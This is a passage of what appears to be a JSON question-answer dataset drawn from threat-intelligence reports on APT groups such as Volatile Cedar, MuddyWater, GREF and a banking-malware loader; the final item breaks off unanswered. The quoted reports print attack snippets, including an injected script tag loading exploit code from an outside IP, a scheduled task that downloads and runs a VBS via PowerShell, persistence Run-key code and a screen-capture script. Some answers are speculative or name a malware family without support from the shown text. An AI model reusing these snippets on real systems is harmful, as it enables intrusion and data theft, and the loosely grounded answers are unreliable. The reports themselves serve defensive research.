Moreover, the Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers.\nWe have seen clear evidence that Volatile Cedar has been active for almost 3 years. While many of the technical aspects of the threat are not considered \"cutting edge\", the campaign has been continually and successfully operational throughout this entire timeline, evading detection by the majority of AV products. This success is due to a well-planned and carefully managed operation that constantly monitors its victims' actions and rapidly responds to detection incidents.\nVolatile Cedar is heavily based on a custom-made remote access Trojan named Explosive, which is implanted within its targets and then used to harvest information. Tracking down these infections was quite a difficult task due to the multiple concealment measures taken by the attackers. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled and deployed specifically for certain targets, and \"radio silence\" periods are configured and embedded specifically into each targeted implant.\nThe modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.\nWe will discuss the attack vectors and infection techniques used by the attack campaign as well as provide indicators that can be used to detect and remove the infection.\nFor hashes, domains, IP addresses and other indicators of compromise, see Appendix C.\nSome of the details in this investigation were edited or omitted from this report to protect customer privacy and ongoing research efforts. Further information may be released in future reports.\nBig Headline: ATTACK TIMELINE\nThe first evidence of any Explosive version was detected in November 2012. Over the course of the timeline, several versions have been detected. New version release dates appear to be closely related to the occurrence of an AV detection event on the previous version, a fact which emphasizes the efforts taken to conceal the attack.\nThe latest Explosive version was released in June 2014 and is still active at the time of this publication. See the figure below for more details.\nBig Headline: STEALTH\nThe Explosive Trojan goes to a lot of effort to hide from common detection tools and merge into its surroundings.\n\u2022 AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. See Figure 1.\n\u2022 New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes.  Once Explosive's memory consumption reaches a predefined threshold, its hosting process is immediately restarted.\n\u2022 API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. This enables the attackers to make sure that heuristic detections do not lead to exposure of the Trojan logic itself.\n\u2022 Custom configurations are set on a per target basis. For example, each Trojan configuration contains periods of \"radio silence\" during which Explosive does not initiate any network communication. These periods are set according to the specific target's working hours and low traffic periods.\n\u2022 Obfuscated C&C communication may appear as random network traffic \"noise\" to certain network inspection devices.\n\u2022 A dedicated thread makes periodic \"secure checks\" with the C&C server to confirm that it is safe to operate. Once the response to these checks is negative, the Explosive Trojan ceases all operations until instructed otherwise.\nBig Headline: CONTROL NETWORK\nThe campaign uses a multi-tiered server backend framework to control the targeted systems. This backend framework is composed of 3 major tiers:\n\u2022 Tier 1\u2014C&C servers: Each Explosive Trojan attempts to connect to its C&C servers, which are used to send commands and receive information extracted from the targets. Each Explosive version has a default hardcoded C&C address. Different versions use different C&C servers.\n\u2022 Tier 2\u2014Static update servers: These servers are periodically connected to obtain the current C&C address.  If a new C&C address is available, the default C&C server is updated with the new one. The static C&C updater address is also hardcoded as part of the Explosive configuration section.\n\u2022 Tier 3\u2014Dynamic update servers: If the static C&C server is nonresponsive, the Explosive infection initiates a custom DGA algorithm which attempts to connect to the dynamic update servers. Once connected, these servers operate the same way as the static updaters. Some Explosive versions also use the dynamic update servers as their C&C servers.\nThe server framework is diverse. While some servers are owned (and possibly also hosted) by the attackers, other servers use publicly shared hosting frameworks or even compromised legitimate servers.\nTable 1 - Explosive server infrastructure\nBig Headline: INFECTION SPREAD\nEvidence shows that the Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers. Additionally, residues of custom-built port scanners and several other attack tools have been found on the victim servers, leading us to believe the attackers use the initially infected servers as a pivot to manually spread to the entire network.\nMore recent versions of the Explosive Trojan contain a configurable option for USB infection. When this option is enabled, Explosive infects any writable mass storage device connected to the server. This can be used to infect additional servers in environments where operational mass storage devices are shared between servers, as well as infect an administrator's home or office machines. For additional information on the USB infection process, see Appendix B.\n\nWhat is the multi-tiered server backend framework used by the Volatile Cedar campaign to control targeted systems, and how does it function?",
    "output": "The Volatile Cedar campaign uses a multi-tiered server backend framework to control targeted systems, composed of three major tiers. Tier 1 consists of C&C servers, which each Explosive Trojan attempts to connect to for sending commands and receiving information extracted from the targets. Each Explosive version has a default hardcoded C&C address, with different versions using different C&C servers. Tier 2 consists of Static update servers, which are periodically connected to obtain the current C&C address. If a new C&C address is available, the default C&C server is updated with the new one. The static C&C updater address is also hardcoded as part of the Explosive configuration section. Tier 3 consists of Dynamic update servers, which are initiated if the static C&C server is nonresponsive. The Explosive infection initiates a custom DGA algorithm to connect to these servers, which operate similarly to the static updaters. Some Explosive versions also use the dynamic update servers as their C&C servers. The server framework is diverse, with some servers owned and possibly hosted by the attackers, while others use publicly shared hosting frameworks or even compromised legitimate servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the MONSOON APT campaign utilize DNS information to gather actionable intelligence on its victims?",
    "output": "The MONSOON APT campaign likely utilizes DNS information to gather actionable intelligence on its victims by searching DNS data for information about the victims' internal networks. According to the APT report, the campaign uses a malware component called Unknown Logger, which is capable of spreading itself laterally and downloading second-stage malware. To achieve this, the attackers may query nameservers for the target organization directly or search through centralized repositories of logged DNS query responses, also known as passive DNS. By analyzing DNS misconfigurations or leaks, the attackers may reveal information about the internal networks of their victims, such as registered name servers, subdomains, mail servers, and other hosts. This information can then be used to establish operational resources, gain initial access, or conduct further reconnaissance. For instance, the attackers may use DNS information to identify vulnerabilities in the victims' networks or to create targeted phishing campaigns. Furthermore, the report mentions that the HANGOVER group, which is linked to the MONSOON campaign, has been known to use freelance coders and sell Surveillance-As-A-Service. This suggests that the attackers may also use DNS information to identify potential targets for their surveillance services. Overall, the use of DNS information plays a crucial role in the MONSOON APT campaign, allowing the attackers to gather valuable intelligence on their victims and conduct targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What specific methods did Abunasar Khan use to register and manage his domains, and how can understanding these methods help in identifying and countering similar tactics employed by other threat actors?",
    "output": "Abunasar Khan used specific methods to register and manage his domains, which included using consistent aliases and email addresses across multiple platforms. He registered domains like zeusadnetwork.com, defiantmarketing.com, and ns2.vpsnoc.com, often using abunasar.net for name services and abunasar.yahoo.com within the Start of Authority (SOA) records. Additionally, he maintained multiple aliases such as 'agnosticon' and 'agnostic' across different forums and websites. By understanding these methods, cybersecurity experts can identify patterns and signatures that can be used to detect similar tactics employed by other threat actors. For instance, monitoring domain registrations for common email addresses, name servers, and SOA records can help in early detection of malicious activities. Furthermore, tracking aliases and usernames across various platforms can provide insights into the broader network of threat actors and their affiliations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the role of the dropper in the Lazarus group's supply-chain attack, and how did it facilitate the execution of subsequent payloads?",
    "output": "The dropper served as the initial stage of the cascade in the Lazarus group's supply-chain attack. Its primary roles included extracting encrypted resources and decrypting them, dropping a configuration file (assocnet.inf) that would be used by the final payloads, and injecting the Downloader into a legitimate service using reflective DLL injection. The dropper expected three parameters in an encrypted state: the names of the Loader and Downloader files, and the necessary decryption key. By performing these actions, the dropper facilitated the execution of subsequent payloads in the attack chain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: SloughRAT analysis\nThe WSF implant has several capabilities. The script uses multilayer obfuscation to hide its true extensions. The screenshots below are the result of the analysis and are deobfuscations for better comprehension.\nThe RAT script needs a function name as an argument to execute correctly and perform its malicious activities. This name is provided by the instrumentor script and could be a method of thwarting automated dynamic analysis, since submitting the RAT script in isolation without the function name as an argument will result in a failed run of the sample in a sandbox.\nPreliminary information gathering and infection registration\nThe RAT script begins execution by performing a WMI query to record the IP address of the infected endpoint.\nDeobfuscation of discovery capabilities.\nIt will then get the user and computer names by querying the environment variables:\n%COMPUTERNAME%\n%USERNAME%\nDeobfuscation of discovery capabilities.\nThis system information is then concatenated using a delimiter and encoded to register the infected system with the C2 server hardcoded into the implant.\nFormat:\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\nRAT capabilities\nThis RAT's capabilities are relatively simple, aside from the information-gathering capabilities described previously.\nOnce the infection is registered with the C2 server, the implant will receive a command code from the C2 server. The implant uses two different URLs:\nOne is used to register the implant and request arbitrary commands from the C2.\nAnother that is used to POST the results of the commands executed on the infected endpoint.\nThe communication with the C2 is done using the common ServerXMLHTTP from the MSXML2 API to instrument an HTTP POST request.\nThe time between each request is randomized, which makes the malware stealthier and can bypass some sandboxes.\nDeobfuscation of HTTP request construction.\nAny data sent to the C2 server is in the format of HTTP forms accompanied by relevant headers, like:\nContent-Type\nContent-Length\nCharSet.\nFirst, the script sends the system information to the first C2 URL, by encoding the message, and sending it via POST request, inside the parameter \"vl\" using the following format:\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\nThen, the server returns a UID constructed via concatenation of the server IP and an UUIDv4.\nFor example, the UID 5-199-133-149-<UUIDv4>\nis stored in a variable and sends keep-alive messages to request commands from the C2.\nThen, this UID is sent through \"vl\" parameters inside a POST HTTP request to another C2 URL.\nWhen the server receives this UID, it returns an encoded message that the script interprets.\nThe message can be:\n\"ok\": Do nothing and send the UID again (like a keep-alive).\n\"401\": This order cleans the UID variable and forces the script to request another UID, by sending a request to the first URI.\nA command to execute that starts the command execution routine.\nA command received from the C2 server will be executed using the command line utility. Its output is recorded in a temporary file on disk in a location such as \"%TEMP%\\stari.txt\". This data is then immediately read and sent out to the C2. The message will have the following format:\n<UID>|!)!)!|<result of command output>\nCommands are executed using the command line:\ncmd.exe /c <command_sent_by_C2> >> <path_to_temp_file>\nDeobfuscation of command execution routine.\nThe attackers used another version of SloughRAT, which isn't as obfuscated as the version illustrated earlier, this time targeting entities in the Arabian peninsula. The overall functionality used in this instance is the same with minor modifications in file paths, delimiters, etc.\nVersion No. 2 of the WSF RAT \u2014 minor changes only.\nThe attackers utilized SloughRAT to deploy (<https://github.com/sysdream/ligolo>)Ligolo, an open-source reverse-tunneling tool to gain a greater degree of control over the infected endpoints. This tactic observed is in sync with (<https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html>)previous findings from Trend Micro.\nOverall infection chain:\nMedium Headline: VBS-based downloaders\nIn another instance, we observed the deployment of VBS-based malicious downloaders in December 2021 and through January 2022 via malicious scheduled tasks set up by the attackers. The scheduled task would look something like this:\nSchTasks /Create /SC ONCE /ST 00:01 /TN <task_name> /TR powershell -exec bypass -w 1 Invoke-WebRequest -Uri '<remote_URL_location>' -OutFile <malicious_VBS_path_on_endpoint>; wscript.exe <malicious_VBS_path_on_endpoint>\nThese tasks download and parse content from the C2 server and execute it on the infected endpoint. The output of the command would be written to a temporary file in the %APPDATA% directory and subsequently read and exfiltrated to the C2.\nThe complete infection chain of these VBS-based downloaders is currently unknown.\nVBS-based downloader.\nMedium Headline: Older campaign using JS-based downloaders\nAn older campaign operated by MuddyWater toward the end of November 2019 and into 2020 utilized maldocs and a convoluted chain of obfuscated scripts to deploy a JavaScript-based downloader/stager on the infected endpoint. This campaign also appears to target Turkish users.\nThe maldoc contains a macro that would drop a malicious obfuscated VBS in a directory on the system. The macros would then create persistence for the VBS via the Registry Run key of the current user. This VBS is responsible for deobfuscating the next payloads and executing\nthem on the endpoint. This execution culminated into a malicious JS downloader being executed on the system to download and execute commands.\nJS-based downloader.\nBig Headline: Conclusion\nCisco Talos has observed Iranian APT groups conducting malicious operations and activities all over the world for years. Particularly, 2021 was prolific in cybersecurity incidents for Iran where state-run organizations were targeted. These events were attributed to Western nations by the Iranian regime, with the promise of revenge. It's hard to say if these campaigns are the result of such promises or just part of these groups' usual activity. However, the fact that they have changed some of their methods of operation and tools is yet another sign of their adaptability and unwillingness to refrain themselves from attacking other nations.\nWe believe there are links between these different campaigns, including the migration of techniques from region to region, along with their evolution into more advanced versions. Overall, the campaigns we describe cover Turkey, Pakistan, Armenia and countries from the Arabian peninsula. While they share certain techniques, these campaigns also denote individuality in the way they were conducted, indicating the existence of multiple sub-teams beneath the Muddywater umbrella \u2014 all sharing a pool of tactics and tools to pick and choose from.\nIn-depth defense strategies based on a risk analysis approach can deliver the best results in protecting against such a highly motivated set of threat actors. However, this should always be complemented by a good incident response plan which has not only been tested with table top exercises, but also reviewed and improved every time it is put to the test on real engagements.\nBig Headline: Coverage\nWays our customers can detect and block this threat are listed below.\n(formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free .\n(formerly Next-Generation Firewall and Firepower NGFW) appliances such as , (<https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html>)Adaptive Security Appliance and  can detect malicious activity associated with this threat.\n, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella .\nAdditional protections with context to your specific environment and threat data are available from the (<https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html>)Firewall Management Center.\nprovides multi-factor authentication for users to ensure only those authorized are accessing your network.\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on (<https://www.snort.org/products>)Snort.org.\nSnort rules for protection against this threat are: 59226 - 59230.\n\nBased on the above text, answer a question. How did the MuddyWater APT group utilize a JavaScript-based downloader in an older campaign targeting Turkish users in late 2019 and early 2020? Describe the infection chain and the role of the JavaScript downloader.",
    "output": "In an older campaign, the MuddyWater APT group used maldocs containing a macro that would drop a malicious obfuscated VBS in a directory on the system. The macros would then create persistence for the VBS via the Registry Run key of the current user. This VBS was responsible for deobfuscating the next payloads and executing them on the endpoint. This execution culminated in a malicious JS downloader being executed on the system to download and execute commands. The infection chain involved multiple stages of obfuscation and persistence mechanisms to ensure the successful deployment of the JavaScript-based downloader.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Summary\nThreat actors often employ stealthy attack techniques to elude detection and stay under the defender's radar. One way they do so is by using uncommon programming languages to develop malware. Using an uncommon programming language to develop malware provides several benefits, including:\nEvading some signature based detections\nImpeding analysis by malware analysts that are unfamiliar with the language\nLimited community detection and published analysis\nNetskope recently analyzed a malicious backdoor written in Nim, which is a relatively new programming language. Netskope Threat labs has observed an increase in Nim-based malware over the past year and expects Nim-based malware to become more popular as attackers continue to modify existing Nim-based samples. One of the highest-profile Nim-based malware families was the , which began spreading in the wild earlier this year.\nThis blog post provides a breakdown of a recent targeted threat that uses Word document bait to deliver a Nim backdoor.\n\nWhy might threat actors choose to use uncommon programming languages like Nim to develop malware, and what specific advantages does this approach provide in evading detection and impeding analysis?",
    "output": "Threat actors choose to use uncommon programming languages like Nim to develop malware for several strategic reasons. Firstly, it helps them evade some signature-based detections, as these systems may not have signatures for malware written in less common languages. Secondly, it impedes analysis by malware analysts who may be unfamiliar with the language, making it harder for them to understand and dissect the malware. Additionally, limited community detection and published analysis further reduce the chances of the malware being identified and mitigated quickly. This approach allows attackers to stay under the radar of defenders and prolong the effectiveness of their malicious campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Historical Background\nWhile GREF's targeting interests overlap with many of the other threat groups we track, their TTP's are somewhat unique. GREF is one of the few APT threat groups that does not rely on phishing as their primary attack method. While they have been known to utilize phishing emails, including malicious attachments and links to exploit sites, they were one of the early adopters of strategic web compromise (SWC) attacks.\nGREF was especially busy in the 2010 timeframe, during which they had early access to a number of 0-day exploits including CVE-2010-0806 (IE 6-7 Peer Objects vuln), CVE-2010-1297 (Adobe Flash vuln), and CVE-2010-2884 (Adobe Flash) that they leveraged in both phishing and SWC attacks. Many of their SWC attacks we saw in this time period were hosted on defense industry-related sites including Center for Defense Information (cdi.org), National Defense Industrial Association (ndia.org), Interservice/Industry Training, Simulation and Education Conference (iitsec.org), and satellite company Millennium Space Systems (millennium-space.com).\nMost of those attacks involved embedding links to exploit code in the homepage of the affected website, and true to their moniker the link was usually placed inside an existing Google Analytics code block in the page source code to help obscure it, rather than simply appended to the end of the file like many other attackers did.\nFigure 1: Sample \"google\" exploit link\n<!\u2014 Google Tracking Code \u2014>\n<script type=\"text/javascript\">\nvar gaJsHost = ((\"https:\" == document.location.protocol) ? \"https://ssl.\" : \"http://\"); document.write(unescape(\"%3Cscript src='\" + gaJsHost + \"180.149.252.181/wiki/tiwiki.ashx' type='text/javascript'%3E%3C/script%3E\"));\n</script>\nThe TTP that most differentiates GREF from other APT threat groups is their unrelenting targeting of web server vulnerabilities to both gain entry to targeted organizations, as well as to get new platforms for SWC attacks. This threat group appears to devote more resources (than most other groups) in attempting to penetrate web servers, and generally, they make no attempt to obscure the attacks, often generating gigabytes of traffic in long-running attacks. They are known to utilize open-source tools such as SQLMap to perform SQL injection, but their most obvious tool of choice is the web vulnerability scanner Acunetix, which leaves tell-tale request patterns in web server logs. They have been known to leverage vulnerabilities in ColdFusion, Tomcat, JBoss, FCKEditor, and other web applications to gain access to servers, and then they will commonly deploy a variety of web shells relevant to the web application software running on the server to access and control the system.\nAnother historical TTP attributed to GREF was their frequent re-use of specific IP ranges to both perform reconnaissance and launch their attacks, as well as for command and control and exfiltration of data. In the early years, we documented them routinely using IP addresses in the 210.211.31.x (China Virtual Telecom \u2013 Hong Kong), 180.149.252.x (Asia Datacenter \u2013 Hong Kong), and 120.50.47.x (Qala \u2013 Singapore). In addition, their reconnaissance activities frequently included referrer headers from google.com and google.com.hk with search features such as \"inurl\" and \"filetype\" looking for specific systems, technologies, and known vulnerabilities.\nBig Headline: XSLCmd Usage\nFor the majority of the time we've been tracking them, XSLCmd has been the \"go-to\" backdoor for GREF, as shown by the wide range of compile dates for the Windows samples we have: from 2009-01-05 to 2013-08-01. Appendix 2 provides a partial list of Windows sample hashes and configuration metadata.\nSince Mach-O binaries do not have a compile timestamp like Windows executables, we can only infer from other data when the OS X variant was developed. As mentioned above, the \"FakeDomain\" was configured to \"www.appleupdate[.]biz\", which was originally registered on August 2, 2012, and the registration appears to have updated on August 7, 2014, but the registrant is still the same \"cast west\". When we found the sample on August 10, the domain did not resolve and there were no historical records for appleupdate[.]biz in any of the passive DNS (pDNS) sources we checked. In the intervening weeks, it has been seen by pDNS sensors, with the first query occurring on August 12, 2014 (which could be related to our research, since the hits are 'nxdomain'), and then on August 16, 2014 there are pDNS records pointing to 61.128.110.38, which you'll notice is the same IP the OS X version was configured to use. This could hint at the possibility that this OS X port of XSLCmd was recently developed and deployed; however, this remains uncertain.\nBig Headline: Other Backdoor Usage\nIn addition to XSLCmd, GREF has utilized a number of other backdoors over time. Another backdoor unique to them, which we call \"ddrh\", is a limited-feature backdoor that was frequently dropped in the SWC attacks in 2010, but has not been seen much since.\nAnother historical backdoor attributed to GREF is one known as ERACS or Trojan.LURKER (not to be confused with LURK0 variant of Gh0st). This full-featured backdoor includes the usual backdoor functionality, including the support for additional modules, but it also includes a USB monitoring capability that generates a directory listing of USB-connected devices.\nWe have also observed GREF using a handful of other common backdoors including Poison Ivy, Gh0st, 9002/HOMEUNIX, HKDoor, and Briba, but these occurrences have been pretty rare. All of the GREF 9002/HOMEUNIX samples in our repository have compile dates from 2009 or 2010. Interestingly enough, there is some overlap with a cluster detailed in (<http://www.fireeye.com/resources/pdfs/fireeye-malware-supply-chain.pdf>)a report we released in November of last year, specifically the \"AllShell\" cluster (C2: smtp.allshell[.]net).\nStarting in mid-2012, GREF started using the Kaba/SOGU backdoor. These early samples, which were discussed in great detail by LastLine in their blog post \"(<http://labs.lastline.com/an-analysis-of-plugx>)An Analysis of PlugX,\" are usually bundled into a RAR self-extracting executable and uses the three-part loading mechanism consisting of an executable, the malicious DLL that is side-loaded, and the shellcode file.\nIn mid-2013, GREF switched to using a new Kaba/SOGU builder that created binaries with unique metadata. For example, many of these samples create a mutex of \"PST-2.0\" when executed, and some have the shared \"HT Applications\" version metadata.\nBig Headline: Conclusion\nThe \"A\" in APT is generally used to describe the threat actors as \"Advanced\", but with this blog, we also see that they are also \"Adaptable.\" Not only have they adopted new Windows-based backdoors over time, as Apple's OS X platform has increased in popularity in many companies, they have logically adapted their toolset to match in order to gain and maintain a persistent foothold in the organizations they are targeting. OS X has gained popularity across enterprises, from less savvy users who find it easy to operate, to highly technical users that utilize its more powerful features, as well as with executives. Many people also consider it to be a more secure computing platform, which may lead to a dangerous sense of complacency in both IT departments and with users. In fact, while the security industry has started offering more products for OS X systems, these systems are sometimes less regulated and monitored in corporate environments than their Windows peers.\nClearly as the OS X platform becomes more widely adopted across enterprises, threat groups like GREF will continue to adapt and find ways to exploit that platform.\nCredit to Jay Smith for his initial analysis of the Windows version of the XSLCmd backdoor and Joshua Homan for his assistance in this research.\nAppendix 1: XSLCmd for OS X created files\nAppendix 2: XSLCmd sample metadata\n\nAnswer this question based on the above context: What is the significance of GREF's use of the XSLCmd backdoor, and how does its usage pattern provide insights into the group's operations and capabilities?",
    "output": "The XSLCmd backdoor has been the primary tool for GREF, with compile dates ranging from January 5, 2009, to August 1, 2013, indicating its consistent use over a prolonged period. The recent discovery of the OS X variant of XSLCmd suggests that GREF has adapted their toolset to target the increasing popularity of Apple's OS X platform. The usage pattern of XSLCmd provides insights into GREF's operational consistency and their ability to maintain and update their backdoor over time. This highlights the need for cybersecurity professionals to stay vigilant and adapt their defenses to counter evolving threats, including those targeting non-Windows operating systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Exfiltration \u2013 bf.exe\nThis malware provides the attacker remote command and control of the victim system via a multifunctional backdoor capability. It communicates via an encrypted tunnel on port 443 with the following IP addresses:\n5.45.179.173\n92.215.45.94\nThese are also the destinations that stolen data will be exfiltrated to. This malware may steal credit card data, as well as screen captures, keylogger information, email addresses from the PST file, enable RDP or VNC sessions, or to obtain additional system information.\nAll exfiltrated information is encrypted with base64+RC2 and sent via HTTP POST messages.\nIf you identify any of these IoC's on your network, you should contact a Trustwave account representative immediately, or reach out directly to the Trustwave SpiderLabs IR team at our 24-hour hotline:\n24hr Hotline +1 (866) 659-9097 Option 5\nInternational: +1 (312) 873-7500, Option 4\nVery Small Headline: A persistence registry key is also created by the loader script:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\nOn ErrOr Resume NExt\nsh.RegWrIte\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\",run_p ErR_NUmBer=err.number If Err_nuMber<>0 Then cerr1.ErrAdd\"Error #I-9\",0 Err.ClEar End If On Error Resume next sh.RegWrite\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\AdobeUpdateManagementTool\",r Err_Number=eRr.number\nThe loader script adds a scheduled task with a task named \"SysChecks\". The purpose of this scheduled task is to run the payload script (AdobeUpdateManagementTool.vbs) in every 5 minutes\nsh.Run\"schtasks /create /tn \"\"SysChecks\"\" /tr \"\"\"&run_pth&\"\"\" /sc minute /mo 5\",0,falSe\nA SWF icon file is also dropped in the folder in order to disguise the dropped file as a Shockwave Flash file:\nA shortcut file is also added in the Windows startup folder as \"AdobeUpdateManagementTool.lnk\"\nSet LinKSTart=sh.CreateShoRTcuT(SPath&\"\\AdobeUpdateManagementTool.lnk\") With LinksTart LinksTart.ArGuMeNts=ruN_pth_scr .dEsCription=\"AdobeUpdateManagementTool\" .HoTKeY=\"CTRL+X\" .IconLocation=ico_Filename .TargEtPath=wscRipt_pThPaTH .WiNdoWStyle=7\n.WorkinGdirectory=sh.ExpandEnvironmEntStrings(\"%windir%\\System32\") .SaVe\nMedium Headline: The Payload Script\nThe payload script is dropped in the \"%temp%\\WindowsUpdate_\" as \"AdobeUpdateManagementTool.vbs\". The script uses obfuscation, a combination of base64 and integer-ed characters (chr) to hide malicious code.\n#Example of obfuscation: (F9lornwzv1(\"cnVuZGxsMzIga2U=\") & \"\" & chr(29 + 85) & chr(81 + 29) & chr(-42 + 143) & chr(-76 + 184) & chr(-20 + 71) & chr(-51 + 101) & chr(67 + -23) & chr(70 + 13) & chr(-57 + 165) & chr(50 + 51) & chr(-67 + 168) & chr(53 + 59) & \"\")\nThe payload script checks if the following folder exists otherwise it creates it: %AllUsersProfile% + \"\\Dropebox\" + (for example in Windows 7 system: C:\\ProgramData\\DropeboxJoePC). This is where it stores additional script files and stolen data:\ndim EZ0uaqbfk9m: EZ0uaqbfk9m = EY4hrd8cuo.ExpandEnvironmentStrings(\"%USERNAME%\") EZ0uaqbfk9m = DT6zmqx4fb( EZ0uaqbfk9m ) FA1pcr7i8c3z = ldrpath +\" \\Dropebox\" + EZ0uaqbfk9m\nThe payload has the following functionality:\nMedium Headline: Desktop screenshot\nA powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop.\n#Desktop screenshot routine, dropped as a powershell $ErrorActionPreference=\"stop\"; try{\n[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\") function\nscreenshot([Drawing.Rectangle]$bounds, $path){ $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height $graphics = [Drawing.Graphics]::FromImage($bmp) $graphics.CopyFromScreen($bounds.Location,\n[Drawing.Point]::Empty, $bounds.size) $bmp.Save($path) $graphics.Dispose() $bmp.Dispose() } $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path $pth = $ScriptDir + \"\\screenshot__.png\" $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1500, 1000) screenshot $bounds $pth; }catch{}\n\nBased on the above text, answer a question. How does the Carbanak malware ensure persistence on infected systems, and what specific registry keys and scheduled tasks are created to achieve this?",
    "output": "The Carbanak malware ensures persistence on infected systems by creating a persistence registry key and adding a scheduled task. The registry key created is 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\AdobeUpdateManagementTool'. Additionally, a scheduled task named 'SysChecks' is set up to run the payload script 'AdobeUpdateManagementTool.vbs' every 5 minutes. These mechanisms allow the malware to maintain its presence and execute its payload repeatedly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Safe attachments\nUsing a real-time security software product from a reputable vendor and keeping the detection signatures up-to-date remains one of the best ways individuals and organizations can protect themselves against most of the threats they face. Antimalware software relies predominately on detection signatures written to target specific malicious binaries, or groups of closely related threats that can be detected heuristically. This approach can be a very effective defense against most malware, which attackers typically try to distribute widely in order to compromise large numbers of computers for their purposes. Unfortunately, conventional antimalware software is often less effective against targeted attacks mounted by groups such as STRONTIUM (see page (<>)3). These groups, which focus on targeting computers at specific institutions, often use specially crafted threats that they test against popular antimalware solutions ahead of time to\nensure that they will not be detected. By the time detection signatures are available to stop such a threat, it may have already compromised the organization.\nExchange Online Advanced Threat Protection adds a new layer of defense against email-borne threats that uses behavioral analysis to detect incoming files that may be harmful, and blocks them before they can reach their intended recipients. When an incoming message includes a potentially dangerous attached file, Exchange Online launches it in a detonation chamber\u2014a virtual sandboxed environment in which potential threats can run without posing harm to any other resources\u2014and monitors it for malicious behavior such as suspicious registry changes, attempts to access memory dumps, changes to executables, and other actions that malware characteristically takes. This monitoring makes it possible to detect and block threats that have never been seen before and for which no detection signatures are available. Exchange Online Advanced Threat Protection includes anti-sandbox detection features such as vulnerability detection to combat advanced threats that avoid taking malicious actions when they determine they are being run in a virtual machine.\nFigure 74. Exchange Online Advanced Threat Protection notifies administrators when malware is detected\nAdministrators can configure how Exchange Online reacts when it determines that an attachment contains malware. Exchange Online can be configured to block delivery of the message, notify administrators, and include a copy of the blocked message so they can analyze it themselves and determine whether additional action is necessary. The process of analyzing a message typically takes about four to five minutes; administrators can set a 30 minute time limit for\nanalysis, after which the message will either be delivered or blocked, as administrators see fit.\nFigure 75. Types of malicious files blocked by Exchange Online Advanced Threat Protection over a two-month period in 2015\nSafe links\nIn addition to sending malware to recipients directly, attackers often send email messages that contain links to malware or drive-by download pages, in hopes that the recipients will click the links and become infected. To provide protection against malicious links, administrators can configure Exchange Online Advanced Threat Protection to rewrite any links in incoming messages to proxy through the Exchange Online service. When a user clicks on a rewritten link, Exchange Online checks the intended destination URL against its database of malicious URLs. If the URL is not determined to be malicious, the user is quickly and seamlessly redirected to their intended destination. If the URL is determined to be malicious, a blocking page is displayed instead. Exchange Online Advanced Threat Protection checks each URL at the time the link is clicked, which means it can protect users from malicious links that were not known to be malicious at the time the message was originally sent.\nFigure 76. Exchange Online Advanced Threat Protection blocks malicious links in email messages\nExchange Online Advanced Threat Protection can be configured to track when users clicks malicious links to help administrators monitor potential targeted attacks and determine which computers may have been exposed to malware. Customers with privacy or compliance concerns can disable the link tracking feature.\nAdvanced Threat Protection is available for subscribers of select Exchange or Office 365 plans for an additional small per-user fee. For more information, see (<https://products.office.com/exchange/online-email-threat-protection>)https://products.office.com/exchange/online-email-threat-protection.\nMedium Headline: Guidance: Defending against malware\nEffectively protecting users from malware requires an active effort on the part of organizations and individuals. For in-depth guidance, see (<http://www.microsoft.com/security/portal/mmpc/shared/prevention.aspx>)Help prevent malware (<http://www.microsoft.com/security/portal/mmpc/shared/prevention.aspx>)infection on your PC at the Microsoft Malware Protection Center website at www.microsoft.com/mmpc.\nFor help understanding the threats that pose the greatest risk to your environment and how to defend against them, see (<https://gallery.technet.microsoft.com/Fixing-the-1-Problem-in-2e58ac4a>)\"Fixing the #1 Problem in (<https://gallery.technet.microsoft.com/Fixing-the-1-Problem-in-2e58ac4a>)Computer Security: A Data-Driven Defense,\" available from Microsoft TechNet.\n\nQuestion: How can administrators configure Exchange Online Advanced Threat Protection to react when it identifies an attachment containing malware, and what options do they have for handling such messages?\n\nAnswer:",
